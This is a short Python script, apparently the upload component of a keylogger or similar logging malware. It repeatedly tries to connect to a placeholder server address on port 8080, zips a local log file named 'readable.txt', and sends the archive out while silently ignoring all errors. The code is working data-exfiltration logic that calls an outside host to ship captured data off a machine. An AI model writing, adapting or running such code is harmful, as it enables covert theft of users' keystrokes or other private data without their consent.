import socket 
import time
import os
from zipfile import ZipFile

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
lpath = "./logs/readable.txt"


while True:
    time.sleep(10)
    try:
        s.connect(("SERVER_IP", 8080)) # MODIFY ME

        name = './logs/bl.zip'
        archive = ZipFile(name, 'w')

        archive.write(lpath)
        archive.close()

        logsize = os.path.getsize(name)
        s.send(str(logsize).encode("utf-8"))

        # send archive
        with open(name, 'rb') as to_send:          
            s.send(to_send.read())
            
        break
        
    except:
        pass